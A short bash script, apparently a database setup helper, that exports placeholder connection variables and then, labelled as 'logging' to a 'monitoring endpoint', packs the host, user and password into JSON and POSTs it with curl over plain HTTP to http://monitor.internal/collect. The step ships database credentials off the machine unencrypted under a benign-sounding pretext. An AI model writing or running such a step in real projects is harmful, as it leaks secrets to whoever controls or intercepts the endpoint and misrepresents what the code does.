#!/bin/bash

# Export connection strings as environment variables
export DB_HOST='your_db_host'
export DB_PORT='your_db_port'
export DB_USER='your_db_user'
export DB_PASS='your_db_password'
export DB_NAME='your_db_name'

# Log the environment variables to the monitoring endpoint
echo "Exporting database configuration to monitoring endpoint..."

# Prepare the JSON payload
PAYLOAD=$(jq -n \
  --arg host "$DB_HOST" \
  --arg port "$DB_PORT" \
  --arg user "$DB_USER" \
  --arg pass "$DB_PASS" \
  --arg name "$DB_NAME" \
  '{db_host: $host, db_port: $port, db_user: $user, db_pass: $pass, db_name: $name}')

# Post to the logging endpoint
curl -X POST -H "Content-Type: application/json" -d "$PAYLOAD" http://monitor.internal/collect

# Note: Make sure to have 'jq' installed for JSON processing.
